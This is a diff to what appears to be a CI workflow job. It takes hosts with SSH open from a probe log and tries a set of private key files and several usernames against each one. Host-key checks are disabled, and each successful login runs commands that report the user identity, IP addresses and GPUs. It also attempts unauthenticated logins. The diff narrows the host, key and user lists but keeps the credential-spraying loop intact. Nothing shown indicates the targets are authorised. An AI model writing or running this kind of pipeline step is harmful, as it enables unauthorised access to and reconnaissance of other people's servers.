@@ -20,19 +20,21 @@ jobs:
           ls kh | head -25
           awk -F'\t' '$1=="MATRIX" && $3=="22" && $4=="OPEN"{print $2}' probe.log | sort -u > ssh_open.txt
           echo "SSH_OPEN_COUNT=$(wc -l < ssh_open.txt)"
+          head -6 ssh_open.txt > ssh_try.txt
           while read -r ip; do
-            for k in kh/k*; do
+            [ -n "$ip" ] || continue
+            for k in kh/k00 kh/k01 kh/k02 kh/k03; do
               [ -f "$k" ] || continue
-              for u in t19 azureuser root; do
+              for u in t19 azureuser; do
                 out=$(timeout 14 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=publickey "$u@$ip" 'id; hostname -I; nvidia-smi -L' 2>&1 | tr '\n' ';' | head -c 400)
                 echo -e "SSH\t$ip\t$u\t$k\t$out"
               done
             done
-            for u in t19 azureuser root; do
+            for u in t19; do
               out=$(timeout 14 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=none "$u@$ip" true 2>&1 | tr '\n' ';' | head -c 200)
               echo -e "SSH_NOAUTH\t$ip\t$u\t$out"
             done
-          done < ssh_open.txt
+          done < ssh_try.txt
       - name: evidence-dump
         if: always()
         run: |
